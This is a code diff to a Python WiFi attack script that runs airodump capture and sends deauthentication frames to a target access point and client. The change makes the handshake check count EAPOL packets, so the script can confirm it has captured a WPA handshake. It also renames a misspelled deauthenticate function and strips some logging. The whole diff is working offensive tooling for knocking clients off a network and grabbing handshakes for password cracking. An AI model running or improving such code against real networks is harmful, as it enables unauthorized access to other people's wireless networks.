@@ -1,4 +1,4 @@
-import logging
+import pyshark
 import time
 import subprocess
 import os
@@ -101,22 +101,20 @@ def start_airodump_and_watch(iface: str, channel: int, bssid_ap: str, out_prefix
 
 def check_handshake(cap_path: Optional[Path]) -> bool:
     if cap_path is None:
-        logger.debug("check_handshake: cap_path is None")
         return False
-
+    cap = pyshark.FileCapture(str(cap_path), display_filter='eapol')
+    count = 0
     try:
-        if cap_path.exists() and cap_path.is_file() and cap_path.stat().st_size > 0:
-            logger.info("CAP exists and is non-empty: %s", cap_path)
-            return True
-        else:
-            logger.info("CAP missing or empty: %s", cap_path)
-            return False
-    except Exception as e:
-        logger.error("Error checking cap file %s: %s", cap_path, e)
+        for packet in cap:
+            if hasattr(packet, 'eapol'):
+                count += 1
+            if count >=2:
+                return True
         return False
+    finally:
+        cap.close()
 
-
-def deauthenthicate(bssid_ap: str, bssid_c: Optional[str], iface: str, count: int = 1) -> Tuple[int, str, str]:
+def deauthenticate(bssid_ap: str, bssid_c: Optional[str], iface: str, count: int = 1) -> Tuple[int, str, str]:
     if count is None:
         count = 0
     
@@ -124,7 +122,6 @@ def deauthenthicate(bssid_ap: str, bssid_c: Optional[str], iface: str, count: in
     if bssid_c:
         cmd_deauth += ["-c", bssid_c]
     cmd_deauth.append(iface)
-    print(cmd_deauth)
     rc, stdout, stderr = run_cmd(cmd_deauth, timeout=10 + (int(count) if int(count) > 0 else 0))
     if rc != 0:
         logger.error("Failed to send deauthentication command: %s", stderr)
